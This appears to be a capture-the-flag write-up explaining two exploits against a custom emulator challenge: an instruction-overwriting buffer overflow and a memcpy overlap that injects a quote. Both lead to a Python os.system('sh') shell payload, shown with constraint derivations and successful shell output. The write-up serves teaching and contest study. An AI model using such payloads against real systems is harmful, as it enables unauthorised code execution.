`magic13.py` also contains functions to convert bytes to base `11**5` data,
and a modification to `run` to be able to set initial registers. With this
`runme13-test-145.py` verifies that the function indeed exhibits the expected
behavior.

# The first vulnerability: Buffer overflow to overwrite instructions

So we are able to pass the program some input, terminated by a newline (so can
not contain a newline). If it does not contain single quotes or backslashes,
it is used as is, pre-concatenated with `b"_*'"` and post-concatenated with
`b"\\n\x00"` (this happens in `10` to `21`). This string is stored at address
`404`. Then, in `32` and `33`, the function `eval_python_base_256` is called
on this buffer at `404`. In this function in turn, we call
`memcpy_from_base256_to_base_161051(dest, src)` with `dest=125` and `src=404`.
Note that `125` is not a very high number, there are instructions that get
executed after that! In particular, the function
`memcpy_from_base256_to_base_161051` starts at `145`. If our input is long
enough, we will thus be able to overwrite the start of
`memcpy_from_base256_to_base_161051` with new instructions. Note that after
echoing the name the user is supposed to have inputted, a warning is printed
out, so that execution jumps to `145` a second time.

As the code after `145` is the one that carries out the copying to `125`, we
have to be careful not to have an input that is too long, otherwise we might
destroy the copying code while the copy is ongoing and then the program might
crash in this function rather than cleanly returning so that on the next
invocation of `memcpy_from_base256_to_base_161051` our code can be executed.
Let us look at the start of `memcpy_from_base256_to_base_161051`.  
```  
     function memcpy_from_base256_to_base_161051(dest, src)  
0145: >>  PUSH RETADDR  
0146:     PUSH REG5  
0147:     PUSH REG6  
0148:     REG5 = REG1  
0149:     REG6 = REG2  
0150:     REG1 = REG2  
0151:     CALL len_until_zero(pointer)  
0152:     REG7 = REG1  
0153:     REG7 += 1  
0154:     RSP = RSP - REG7  
0155:     PUSH REG1  
0156:     PUSH REG7  
0157:     REG3 = REG7  
0158:     REG2 = REG6  
0159:     REG1 = RSP  
0160:     REG1 += 2  
0161:     CALL memcpy(dest, src, length)  
0162:     REG2 = RSP  
0163:     REG2 += 1  
0164:     REG1 = REG5  
0165:     RSP += -2  
0166:     REG5 = 0 = b'\x00'  
0167:  >  REG7 = MEM[REG2 + 0]  
```  
We can see that up to `166` there is no loop, and nothing is copied to the
destination yet: The length of the source is obtained, space on the stack
allocated, and then the source buffer is copied to the stack. Thus it should
be fine to use an input that will cause overwriting up to and including
address `166`. The idea would be that a couple of instructions starting at
`145` will cause evaluation of Python code that is stored at a known address
below `145`, in which we will have placed our Python payload, such as
`os.system("sh")`.

Let us collect the list of requirements we have for our payload. We will call
what we send `payload` and `b"_*'" + payload + b"\\n'"` the `full_payload`.

- `payload` can not contain newlines, backslashes, single quotes, or zero bytes  
- The conversion of `full_payload` to base `11**5` should be at most `167 - 125 = 42` words long.  
- `full_payload` converted to base `11**5` should have some successive words in the middle that converted back to base `256` correspond to the Python code we want to execute.  
- `full_payload` converted to base `11**5` should have instructions starting from word `145 - 125 = 20` that cause the just mentioned Python code to execute.  
- `full_payload` must be decodable to a string using `latin1`.

## Instructions to execute Python code

Here are some instructions that work.  
```  
0145:     REG1 += 12  
0146:     REG2 = 8 = b'\x08'  
0147:     REG1 = EVALUATEPY MEM[REG1:REG1+REG2]  
0148:     HALT  
```  
When the function gets called from the function
`eval_python_base_256(pointer)`, the value of `REG1` will be `125`. Adding
`12` gives us `137`. We will then make the base `11**5` data that is to be
evaluated as Python 8 words long, ending just before these instructions.  
Something like `b'os.system("sh")'` takes 15 bytes, and as we saw earlier each
word of base `11**5` corresponds to roughly `17.3/8 ≈ 2.2` bytes, let us take
`2.1` to be safe, and then 8 words are enough for `8 * 2.1 > 16` bytes, so
this is enough.  
We end with a `HALT` instruction to ensure a clean exit after we exit the
shell.

To get the numeric values corresponding to these instructions we will have to
look at the code, identify what value variables such as `c`, `f`, `g`, and `h`
etc. need to have, and then figure out what the instructions needs to be in
base 11.

We obtain that we want the following:  
```  
payload_emulator_instructions = [81935, 994, 2804, 0]  
```

## How to cook up the payload satisfying all requirements

We have constraints on the payload that both impact its base `256` and base
`11**5` represenation. Unfortunately, changing one digit in either base can
completely change a lot of digits in the other base. However, note that
usually this only happens to sufficiently low significance digits in the other
basis. *Usually* because we might have a number that for example in base 11
has the least significant couple of digits all `0`, but not in binary. Then if
we change one very low significant binary bit from `1` to `0`, this will make
flip some low significance base 11 digits from `0` to `A`. Because of this it
is actually best to initialize digits where we have a choice in this kind of
situation to something random or of medium value, rather than  for example all
`0`.

Thus the way we should proceed is from the most significant end downwards,
alternating which basis we adjust.  
So the idea is as follows:

1. Begin with something random that, in base `256`, ends with `b"\\n'"`, and that does not otherwise contain the characters newline, backslash, single quote, or the zero byte.  
2. Change some base 11 digits towards the higher significance end to contain our encoded Python code as well as the instructions we just discussed. Hope that this does not destroy what the last three bytes are in base `256` (if we were unlucky, try again from step 1).  
3. When interpreting the new number in base `256` again, some bytes that are not the last three may have become illegal ones (newline, backslash, single quote, zero byte). Adjust those by adding one.  
4. Adjust the first three bytes to be `b"_*'"`.  
5. Convert the end result into bytes and cut off the first and last three bytes. The part in the middle is our payload.  
6. Check a final time that this payload satisfies all requirements, including the decoding step regarding `latin1` and that the decoded string can actually be evaluated by Python. If not, start again from step 1. In practice, it does not take many tries until one finds a valid payload like this.

Creating a payload like this has been implemented in `runme14.py`. It will go
through the steps above, and at the end verify that all properties are
satisfied. If this is not the case there will be an `AssertionError` or
`SyntaxError` and `runme14.py` needs to be run again. If everything verified
as it should, then the emulator is run with this input as a final test. This
should start a shell.

The output of `runme14.py` on a successful run is reproduced below.  
```  
user@ctf-fe-2022$ ./runme14.py  
The instructions in the payload are the following when loaded at 700:  
0700:     REG1 += 12  
0701:     REG2 = 8 = b'\x08'  
0702:     REG1 = EVALUATEPY MEM[REG1:REG1+REG2]  
0703:     HALT

Step 1: Base 11**5: [111242, 150449, 72842, 118980, 111491, 20754, 102804,
97339, 3220, 105622, 80760, 47851, 104857, 74258, 33121, 17215, 14, 98515,
124690, 74691, 121462, 72899, 136909, 121091, 37828, 89340, 109283, 70696,
144197, 52632]  
Step 1: Base 2**8:  [36, 77, 105, 55, 120, 105, 69, 105, 102, 77, 39, 55, 59,
104, 57, 87, 50, 60, 59, 91, 51, 120, 80, 107, 41, 69, 75, 98, 94, 60, 96, 34,
58, 101, 107, 108, 35, 106, 67, 57, 96, 80, 107, 75, 46, 47, 102, 119, 81,
102, 118, 43, 43, 41, 89, 93, 106, 52, 121, 34, 96, 49, 92, 110, 39]  
Step 1:
b'$Mi7xiEifM\'7;h9W2<;[3xPk)EKb^<`":ekl#jC9`PkK./fwQfv++)Y]j4y"`1\\n\''

Step 2: Base 11**5: [111242, 150449, 72842, 118980, 111491, 20754, 102804,
97339, 3220, 105622, 80760, 47851, 144332, 98232, 150289, 141022, 126407,
12595, 12240, 0, 81935, 994, 2804, 0, 37828, 89340, 109283, 70696, 144197,
52632]  
Step 2: Base 2**8:  [40, 195, 32, 27, 73, 49, 21, 46, 75, 70, 206, 248, 94,
69, 4, 144, 31, 236, 215, 125, 229, 49, 174, 56, 208, 217, 30, 73, 144, 220,
159, 54, 17, 28, 192, 3, 206, 56, 139, 184, 225, 248, 52, 105, 200, 75, 116,
164, 218, 228, 3, 194, 42, 41, 89, 93, 106, 52, 121, 34, 96, 49, 92, 110, 39]  
Step 2: b'(\xc3
\x1bI1\x15.KF\xce\xf8^E\x04\x90\x1f\xec\xd7}\xe51\xae8\xd0\xd9\x1eI\x90\xdc\x9f6\x11\x1c\xc0\x03\xce8\x8b\xb8\xe1\xf84i\xc8Kt\xa4\xda\xe4\x03\xc2*)Y]j4y"`1\\n\''

Step 3: Base 11**5: [111242, 150449, 72842, 118980, 111491, 20754, 102804,
97339, 3220, 105622, 80760, 47851, 144332, 98232, 150289, 141022, 126407,
12595, 12240, 0, 81935, 994, 2804, 0, 37828, 89340, 109283, 70696, 144197,
52632]  
Step 3: Base 2**8:  [40, 195, 32, 27, 73, 49, 21, 46, 75, 70, 206, 248, 94,
69, 4, 144, 31, 236, 215, 125, 229, 49, 174, 56, 208, 217, 30, 73, 144, 220,
159, 54, 17, 28, 192, 3, 206, 56, 139, 184, 225, 248, 52, 105, 200, 75, 116,
164, 218, 228, 3, 194, 42, 41, 89, 93, 106, 52, 121, 34, 96, 49, 92, 110, 39]  
Step 3: b'(\xc3
\x1bI1\x15.KF\xce\xf8^E\x04\x90\x1f\xec\xd7}\xe51\xae8\xd0\xd9\x1eI\x90\xdc\x9f6\x11\x1c\xc0\x03\xce8\x8b\xb8\xe1\xf84i\xc8Kt\xa4\xda\xe4\x03\xc2*)Y]j4y"`1\\n\''

Step 4: Base 11**5: [47728, 150452, 72842, 118980, 111491, 20754, 102804,
97339, 3220, 105622, 80760, 47851, 144332, 98232, 150289, 141022, 126407,
12595, 12240, 0, 81935, 994, 2804, 0, 37828, 89340, 109283, 70696, 144197,
52632]  
Step 4: Base 2**8:  [95, 42, 39, 27, 73, 49, 21, 46, 75, 70, 206, 248, 94, 69,
4, 144, 31, 236, 215, 125, 229, 49, 174, 56, 208, 217, 30, 73, 144, 220, 159,
54, 17, 28, 192, 3, 206, 56, 139, 184, 225, 248, 52, 105, 200, 75, 116, 164,
218, 228, 3, 194, 42, 41, 89, 93, 106, 52, 121, 34, 96, 49, 92, 110, 39]  
Step 4:
b'_*\'\x1bI1\x15.KF\xce\xf8^E\x04\x90\x1f\xec\xd7}\xe51\xae8\xd0\xd9\x1eI\x90\xdc\x9f6\x11\x1c\xc0\x03\xce8\x8b\xb8\xe1\xf84i\xc8Kt\xa4\xda\xe4\x03\xc2*)Y]j4y"`1\\n\''

Verifying that start and end are correct in base 2...  
Prefix is b"_*'", expected is b"_*'"  
Suffix is b"\\n'", expected is b"\\n'"  
Verifying there are no illegal characters  
Verifying that the full payload can be decoded...  
Verifying that evaluating this does not cause problems...  
Verifying the length is at most 42 words...  
Verifying the words in the middle are as expected...

Payload:
b'\x1bI1\x15.KF\xce\xf8^E\x04\x90\x1f\xec\xd7}\xe51\xae8\xd0\xd9\x1eI\x90\xdc\x9f6\x11\x1c\xc0\x03\xce8\x8b\xb8\xe1\xf84i\xc8Kt\xa4\xda\xe4\x03\xc2*)Y]j4y"`1\n'  
Running the emulator with the payload as input...

Please enter your name  
> Hello,        1.KF��^E���}�1�8��I�ܟ6��8����4i�Kt����*)Y]j4y"`1  
$ pwd  
/home/user/writeup/snake-oil  
$ exit

user@ctf-fe-2022$  
```

To get a shell on the remote we now only have to send one of the valid
payloads that `runme14.py` produces. This is done in `solve.py`.

# The second vulnerability: Using a buffer overlap to obtain a single quote

Let us again look at the start of `memcpy_from_base256_to_base_161051`.  
```  
     function memcpy_from_base256_to_base_161051(dest, src)  
0145: >>  PUSH RETADDR  
0146:     PUSH REG5  
0147:     PUSH REG6  
0148:     REG5 = REG1  
0149:     REG6 = REG2  
0150:     REG1 = REG2  
0151:     CALL len_until_zero(pointer)  
0152:     REG7 = REG1  
0153:     REG7 += 1  
0154:     RSP = RSP - REG7  
0155:     PUSH REG1  
0156:     PUSH REG7  
0157:     REG3 = REG7  
0158:     REG2 = REG6  
0159:     REG1 = RSP  
0160:     REG1 += 2  
0161:     CALL memcpy(dest, src, length)  
0162:     REG2 = RSP  
0163:     REG2 += 1  
0164:     REG1 = REG5  
0165:     RSP += -2  
0166:     REG5 = 0 = b'\x00'  
0167:  >  REG7 = MEM[REG2 + 0]  
```  
As we mentioned already above, after the length of the source is obtained,
space on the stack allocated, and then the source buffer is copied to the
stack. Let us consider the specific call to this function regarding our own
input. The relevant calls arise as follows:  
```  
0032:     REG1 = 404  
0033:     CALL eval_python_base_256(pointer)  
...  
     function eval_python_base_256(pointer)  
0117: >>  PUSH RETADDR  
0118:     REG2 = REG1  
0119:     REG1 = 125 = b'}'  
0120:     CALL memcpy_from_base256_to_base_161051(dest, src)  
...  
     function memcpy_from_base256_to_base_161051(dest, src)  
0145: >>  PUSH RETADDR  
0146:     PUSH REG5  
0147:     PUSH REG6  
0148:     REG5 = REG1  
0149:     REG6 = REG2  
0150:     REG1 = REG2  
0151:     CALL len_until_zero(pointer)  
0152:     REG7 = REG1  
0153:     REG7 += 1  
0154:     RSP = RSP - REG7  
0155:     PUSH REG1  
0156:     PUSH REG7  
0157:     REG3 = REG7  
0158:     REG2 = REG6  
0159:     REG1 = RSP  
0160:     REG1 += 2  
0161:     CALL memcpy(dest, src, length)  
```  
Our input, with prefix and suffix, is stored starting from address `404`, and
stored in upwards direction. The stack pointer is set to `550` at the start
and grows downwards. Note that the stack pointer addresses the word that will
be popped at the next `POP`, so a `PUSH` will not write into this address, but
the one below. The main function does not push anything to the stack. Then
`eval_python_base_256(pointer)` will push the return address, making the stack
pointer `549`. Then at the start of `memcpy_from_base256_to_base_161051(dest,
src)`, three pushes are made, so that the stack pointer will become `546`.

Now the length of the input is calculated, and copied to `REG7`. This is
without the zero byte at the end, but `REG7` is incremented to count that as
well. Then this length plus zero byte many words are allocated on the stack,
and the source string is copied (including the zero byte at the end).

From `404` (inclusive) to `546` (not inclusive) there are `142` words, which
is `2*71`. This means that if the string being copied here (our input with
prefix and suffix, including the zero byte at the end) is longer than `71`
words, then there will be an overlap.

Concretely, as the `memcpy` function proceeds wordswise from the bottom, it
some of the later words in the source buffer will have been already
overwritten with the *beginning* of the source buffer, as these words also act
as the beginning of the *destination* buffer.

To explain this better, let us assume that the distance between the buffer
start and the stack were `20` rather than `142` words, and suppose the input
we give would be `ABCDE`. Then before the copying, the relevant part of the
memory would look like this, where address `0` here corresponds to `404` in
the real memory layout.

```  
| Address | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 || 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17 | 18 | 19 |  
| Content | _ | * | ' | A | B | C | D | E || \ | n |  ' | \0 |    |    |    |    |    |    |    |    |  
```  
The length is taken with the zero byte as explained above, so in this case we
get `12`, which means words `0` through `11` will be copied to words `8`
through `19`.

So the `memcpy` function begins copying, beginning with the first word,
yielding the following.  
```  
| Address | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 || 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17 | 18 | 19 |  
| Content | _ | * | ' | A | B | C | D | E || _ | n |  ' | \0 |    |    |    |    |    |    |    |    |  
```  
After two more words being copied we are left with this:  
```  
| Address | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 || 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17 | 18 | 19 |  
| Content | _ | * | ' | A | B | C | D | E || _ | * |  ' | \0 |    |    |    |    |    |    |    |    |  
```  
And after a total of 8 words have been copied this is the situation.  
```  
| Address | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 || 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17 | 18 | 19 |  
| Content | _ | * | ' | A | B | C | D | E || _ | * |  ' |  A |  B |  C |  D |  E |    |    |    |    |  
```  
Note that now the very next word to be copied is word `8` being copied to word
`16`. But we already modified word `8`. So now we are copying the beginning of
our string.  
```  
| Address | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 || 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17 | 18 | 19 |  
| Content | _ | * | ' | A | B | C | D | E || _ | * |  ' |  A |  B |  C |  D |  E |  _ |    |    |    |  
```  
Finally, the end result will be the following.  
```  
| Address | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 || 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17 | 18 | 19 |  
| Content | _ | * | ' | A | B | C | D | E || _ | * |  ' |  A |  B |  C |  D |  E |  _ |  * |  ' |  A |  
```

One thing to note additionally is that before the call to `memcpy`, the two
words on the stack just below the buffer that is copied to will be
overwritten. This causes the `D` and `E` characters that are here at addresses
`6` and `7` to be overwritten by junk. So we can not count on a couple of
bytes of payload in that range.

So now let us calculate how exactly our payload will be transformed. Assume
that the string we input, without the concluding newline, is `n` bytes long.
Then, after concatenation with prefix and suffix and the final zero byte the
total length will be `n+7`. We certainly need `n+7 > 71` to have the described
effect, so let us write `n+7 = 71 + m`, where `m>0`. Then the copy on the
stack will begin at offset `71 - m` of the original string. This means that
the first `71 - m` characters will be the original ones, and starting with
character indexed by `71 - m` there will be `2m` characters from the beginning
again, with no further wraparound happening as long as `2m < 71 - m`, which is
equivalent to `m <= 23`.

If the evaluated string is of the form `_*'???'+CODE#???`, where the `???`
stand for some junk that isn't relevant (but in the first one not all
characters are allowed, for example a single quote would be problematic) and
`CODE` stands for python code to be evaluated such as `os.system("sh")`, then
this will print the first junk string, then evaluate our Python code, and then
thow an exception due to not being able to add values of certain types.

We can now achieve such a string being evaluated by inputting a string
consisting of `+` concatenated with the Python code we want to run, and which
we assume to be of length `c`, concatenated with `#` and a string of `k`
copies of `A`s, for a certain value of `k`.

So what value of `k` should we choose? We will have `n = 1 + c + 1 + k = 2 + c
+ k`. This implies that  
`m = n + 7 - 71 = 2 + c + k + 7 - 71 = c + k - 62`.  
The condition `m > 0` that we need to have the overlap effect at all then
implies `k > 62 - c`.  
The condition `m <= 23` that we need to avoid a second overlap then implies `k
<= 85 - c`.  
Then we need the string up to the full code we want to evaluate to be part of
the copied beginning. Thus `3 + 1 + c <= 2m` is required, as exactly `2m`
characters from the start reoccur. This is equivalent to  
`4 + c <= 2*c + 2*k - 2*62` and thus to  
`2 + 62 - c/2 <= k`, so that we also need  
`k >= 64 - c/2`.  
Note that `64 - c/2 > 62 - c`, so this condition is stronger than `k > 62 -
c`.

Finally, recall the two junk bytes we get just below destination buffer due to
something being written on the stack.  
We don't want that to overwrite our code or `#` following it. So those two
bytes will have offsets `71 - m - 2` and `71 - m -1`.  
We thus need `3 + 1 + c + 1 < 71 - m - 2`, which is equivalent to  
`5 + c < 69 - m`, which is equivalent to  
`5 + c < 69 - c - k + 62`, which is equivalent to  
`k < 126 - 2c`.

We thus conclude in the end that we must have  
```  
64 - c/2 <= k <= 85 - c  
and  
0 <= k < 126 - 2c  
```  
The first inequality can be satisfied with nonnegative `k` as long as the
upper bound is at least `0` and the lower bound is at most the upper bound.  
The first condition comes down to `c <= 85`. The second condition means  
`64 - c/2 <= 85 - c` which is equivalent to  
`c/2 <= 21` which is equivalent to  
`c <= 42`.  
The last remaining condition is `k < 126 - 2c`, which is equivalent to `(k +
c) + c < 126`. Note that if `c <= 40`, then this will be satisfied as `k + c
<= 85`. If instead `c = 41` then we will need to have `k >= 44`, which implies
`k + 2c >= 129`, so here there is no solution for `k`, and similarly if `c =
42` then `k >= 43`, but `43 + 2*42 = 127`. So the upshot is that for a
solution to exist we must have `c <= 40`.

There is yet another constraint that we need to be aware of. If we use up too
much of the stack, then the stack will grow too far and overwrite instructions
and crash the program. Similarly, recall from the previous
vulnerability/exploit that the base 11 version of our full payload should be
maximum `42` words long. This latter condition comes down to  
`(n + 7)*log(2**8, 11**5) <= 42`  
which is equivalent to  
`9 + c + k <= 90`  
and hence `k <= 81 - c`.  
Empirically it seems that with these restrictions we do not run into problems
with the stack.

Thus the procedure to obtain the payload is as follows:

1. Begin with Python code to execute of length `c <= 40`.  
2. Choose a nonnegative integer `k` satisfying `64 - c/2 <= k <= 81 - c`.  
3. Take the concatenation of `+` with the code, then `#`, and then `k` many other characters (and at the end a newline).

This has been implemented in `runme15.py`, where such a payload is prepared
and tried in the emulator. One such payload can also be found in `solve.py` to
try on the challenge remotely.

# Final comments

During the competition I found and used the solution using the buffer overflow
to write instructions that get called later. I worked through the first night
of the contest for that, and it took me several hours at the end to cook up
the payload satisfying all the required properties. This was way longer than
it should have taken, and I made about every mistake possible (e.g. getting
confused multiple times on where the prefix is contained or not in what I am
currently looking at, and so on) and needed a while to figure out that I
should construct the payload beginning from the most significant end. I think
I would have likely been able to do this faster if I had been less tired, so
my takeaway is to be more diligent with sleeping the next time.

The second solution I presented here, using the buffer overlap to copy the
single quote from the start into the string, seems to be the vulnerability
that the second team that solved the challenge, `Too young to win defcon, too
old to win ecsc`, used.

Original writeup (https://gitlab.com/shalaamum/ctf-writeups/-/tree/master/FE-
CTF%202022/snake-oil).